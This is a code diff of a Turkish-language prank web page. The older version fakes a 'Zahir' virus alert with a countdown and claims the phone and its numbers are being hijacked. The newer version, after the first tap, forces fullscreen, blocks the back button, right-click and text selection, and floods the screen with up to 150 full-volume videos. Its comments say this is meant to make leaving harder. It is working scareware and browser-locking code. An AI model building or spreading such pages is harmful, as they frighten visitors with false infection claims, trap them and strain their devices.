@@ -3,235 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Zahir VİRÜS - SİSTEM ÇÖKTÜ</title>
+    <title>ZAHİRSİSTEM KİLİTLENDİ</title>
     <style>
         body {
             background-color: black;
-            color: red;
-            font-family: 'Courier New', Courier, monospace;
             margin: 0;
             padding: 0;
-            overflow: hidden;
+            overflow: hidden; /* Kaydırmayı engelle */
             height: 100vh;
             width: 100vw;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            cursor: none;
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: none; /* Mobilde sayfayı kaydırmayı engelle */
+            cursor: none; /* Fare imlecini gizle */
+            touch-action: none;
         }
 
-        #main-content {
-            width: 100%;
-            height: 100%;
-            position: relative;
-            transition: transform 0.1s; /* Zoom geçişi */
-        }
-
-        .warning-text {
-            position: absolute;
-            width: 100%;
-            font-size: 1.8rem;
-            font-weight: 900;
-            text-shadow: 0 0 10px red, 0 0 20px darkred;
-            z-index: 10;
-        }
-
-        #title {
-            top: 5%;
-            color: red;
-            font-size: 2.5rem;
-            animation: shake 0.1s infinite;
-        }
-
-        #status1 {
-            top: 20%;
-            color: yellow;
-            animation: flash 0.2s infinite;
-        }
-
-        #status2 {
-            top: 30%;
-            color: orange;
-            animation: flash 0.3s infinite alternate;
-        }
-
-        #timer {
-            top: 40%;
-            color: red;
-            font-size: 3rem;
-            animation: zoom 0.5s infinite alternate;
-            z-index: 10;
-        }
-
-        /* Korkunç Video Katmanı */
-        #scary-video {
+        .video-container {
             position: absolute;
             top: 50%;
             left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            transform: translate(-50%, -50%) scale(1.5);
-            z-index: 5;
-            opacity: 0.8;
-            animation: video-zoom 2s infinite alternate;
-        }
-
-        @keyframes flash {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        @keyframes shake {
-            0% { transform: translate(1px, 1px) rotate(0deg); }
-            10% { transform: translate(-1px, -2px) rotate(-1deg); }
-            20% { transform: translate(-3px, 0px) rotate(1deg); }
-            30% { transform: translate(3px, 2px) rotate(0deg); }
-            40% { transform: translate(1px, -1px) rotate(1deg); }
-            50% { transform: translate(-1px, 2px) rotate(-1deg); }
-            60% { transform: translate(-3px, 1px) rotate(0deg); }
-            70% { transform: translate(3px, 1px) rotate(-1deg); }
-            80% { transform: translate(-1px, -1px) rotate(1deg); }
-            90% { transform: translate(1px, 2px) rotate(0deg); }
-            100% { transform: translate(1px, -2px) rotate(-1deg); }
-        }
-
-        @keyframes zoom {
-            0% { transform: scale(0.8); }
-            100% { transform: scale(1.2); }
-        }
-
-        @keyframes video-zoom {
-            0% { transform: translate(-50%, -50%) scale(1.2); filter: contrast(150%) hue-rotate(0deg); }
-            100% { transform: translate(-50%, -50%) scale(2.0); filter: contrast(200%) hue-rotate(30deg); }
-        }
-        
-        body.glitch {
-            animation: glitch-anim 0.2s infinite;
-        }
-        
-        @keyframes glitch-anim {
-            0% { filter: invert(0); transform: translate(0,0); }
-            20% { filter: invert(1); transform: translate(-5px, 5px); }
-            40% { filter: invert(0); transform: translate(5px, -5px); }
-            60% { filter: invert(1); transform: translate(-5px, -5px); }
-            80% { filter: invert(0); transform: translate(5px, 5px); }
-            100% { filter: invert(0); transform: translate(0,0); }
-        }
-
-        /* Tıklama Katmanı */
-        #unmute-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999;
-            background: transparent;
+            transform: translate(-50%, -50%);
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+            /* Ekrana sığdır */
+            object-fit: cover; 
         }
     </style>
 </head>
-<body class="glitch">
-
-    <div id="unmute-overlay"></div>
-
-    <div id="main-content">
-        <div id="title" class="warning-text">Zahir VİRÜS</div>
-        <div id="status1" class="warning-text">TELEFON ELE GEÇİRİLİYOR...</div>
-        <div id="status2" class="warning-text">NUMARALAR ELE GEÇİRİLİYOR 1-100</div>
-        <div id="timer" class="warning-text">100</div>
-        
-        <!-- KORKUNÇ VİDEO (BURAYA KENDİ VİDEO LİNKİNİ VEYA DOSYANI KOY) -->
-        <!-- Örnek olarak internetteki bir korku videosunu kullandım, kendi videonu koymak için src="video.mp4" yapabilirsin -->
-        <video id="scary-video" autoplay loop muted playsinline>
-            <source src="https://cdn.pixabay.com/video/2022/04/12/112647-698472061_large.mp4" type="video/mp4">
-        </video>
-
-        <!-- SES KAYNAĞI (Zahir.mp3 dosyasını index.html ile aynı klasöre at) -->
-        <audio id="horror-sound" loop preload="auto">
-            <source src="Zahir.mp3" type="audio/mpeg">
-        </audio>
-    </div>
+<body>
 
     <script>
-        const timerElement = document.getElementById('timer');
-        const audio = document.getElementById('horror-sound');
-        const video = document.getElementById('scary-video');
-        const body = document.body;
-        const overlay = document.getElementById('unmute-overlay');
-        const mainContent = document.getElementById('main-content');
-        let timeLeft = 100;
-
-        // Tıklanınca çalışacak korku başlatıcı
-        function startHorror() {
-            // 1. TAM EKRAN YAP (Üstteki başlık çubuğunu gizler)
+        // 1. SES FULLEME VE VİDEO OLUŞTURMA FONKSİYONU
+        function startChaos() {
+            // Tam ekran zorla (Çıkışı zorlaştırmak için)
             if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(err => console.log(err));
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
+                document.documentElement.requestFullscreen().catch(e => {});
             }
-
-            // 2. SESİ FULLE VE OYNAT
-            audio.volume = 1.0; 
-            audio.play().catch(e => console.log("Ses engellendi:", e));
-            
-            // Videoyu da sesli oynat (Tarayıcı kuralı gereği tıklama sonrası izin verir)
-            video.muted = false;
-            video.volume = 0; // Videonun kendi sesini kapat ki Zahir.mp3 duyulsun
-            video.play().catch(e => console.log("Video hatası:", e));
 
             // Ekran kararmasını engelle
             if ('wakeLock' in navigator) {
-                navigator.wakeLock.request('screen').catch(err => console.log(err));
+                navigator.wakeLock.request('screen').catch(e => {});
             }
 
-            overlay.style.display = 'none';
-            
-            document.removeEventListener('click', startHorror);
-            document.removeEventListener('touchstart', startHorror);
+            // 1 SANİYE SONRA VİDEOLARI PATLAT
+            setTimeout(() => {
+                // İlk büyük videoyu oluştur
+                createVideo();
+
+                // Her 100 milisaniyede bir yeni video ekle (Ekran tıka basa dolana kadar)
+                setInterval(createVideo, 100);
+            }, 1000); // 1000 ms = 1 Saniye
         }
 
-        document.addEventListener('click', startHorror);
-        document.addEventListener('touchstart', startHorror);
+        // 2. VİDEO OLUŞTURUCU (Ekranı Kaplayan ve Sesli)
+        let videoCount = 0;
+        function createVideo() {
+            // Ekranın dolup taşmaması için max 150 video yapalım (yoksa cihaz aşırı ısınır ve uygulama kapanır)
+            if (videoCount > 150) return; 
 
-        // 3. SESİ SÜREKLİ FULDE TUTMA MANTIĞI
-        // Her 200 milisaniyede bir ses seviyesini kontrol et, eğer düşürülürse tekrar 1.0 yap!
-        setInterval(() => {
-            if (!audio.paused && audio.volume < 1.0) {
-                audio.volume = 1.0;
-            }
-        }, 200);
+            const vid = document.createElement('video');
+            vid.src = "korku.mp4"; // Sadece bu videoyu kullanır
+            
+            // VİDEO AYARLARI
+            vid.loop = true;        // Sürekli dönsün
+            vid.muted = false;      // SESİ AÇIK OLSUN
+            vid.volume = 1.0;       // SES FULLENSİN
+            vid.autoplay = true;    // Otomatik başlasın
+            vid.playsInline = true;
+            
+            // Rastgele boyut ve konum (Ekran kaos ortamına dönsün)
+            const size = Math.random() * 100 + 50; // 50vw ile 150vw arası rastgele boyut
+            const posX = Math.random() * 100;
+            const posY = Math.random() * 100;
 
-        // 4. BAŞLIĞA TIKLANINCA EKRANI ZOOM YAPIP GİZLEME
-        document.addEventListener('click', function(e) {
-            // Eğer üst tarafa (başlığa) tıklanırsa, ekranı devasa boyuta yakınlaştır
-            if (e.clientY < 100) { 
-                mainContent.style.transform = "scale(5) translateY(50px)";
-                body.style.overflow = "hidden"; // Kaydırmayı tamamen kapat
-            }
+            vid.style.position = 'absolute';
+            vid.style.width = size + 'vw';
+            vid.style.top = posY + 'vh';
+            vid.style.left = posX + 'vw';
+            vid.style.zIndex = 999; // Her zaman en üstte
+            vid.style.transform = `translate(-50%, -50%) rotate(${Math.random() * 360}deg)`; // Rastgele dönme açısı
+
+            document.body.appendChild(vid);
+            
+            // Videoyu oynat (Tarayıcı hata verirse yakala)
+            vid.play().catch(e => {});
+            
+            videoCount++;
+        }
+
+        // 3. KULLANICI EKRANA TIKLADIĞINDA BAŞLAT
+        // Tarayıcılar sesin otomatik çalmasına izin vermediği için ilk tıklamayı bekliyoruz.
+        document.addEventListener('click', function init() {
+            document.removeEventListener('click', init);
+            startChaos();
+        });
+        
+        document.addEventListener('touchstart', function initMobile() {
+            document.removeEventListener('touchstart', initMobile);
+            startChaos();
         });
 
-        // 5. GERİ SAYIM
-        const countdown = setInterval(() => {
-            timeLeft--;
-            timerElement.innerText = timeLeft;
-
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                timerElement.innerText = "BANLANDIN!";
-                timerElement.style.fontSize = "4rem";
-                timerElement.style.color = "darkred";
-            }
-        }, 1000);
-
-        // 6. GERİ TUŞUNU ENGELLEME (Android)
+        // 4. ÇIKIŞ ENGELLEYİCİLER
+        // Geri tuşu engeli
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1); 
         };
+        
+        // Sağ tık ve metin seçimini engelle
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('selectstart', event => event.preventDefault());
     </script>
 </body>
 </html>
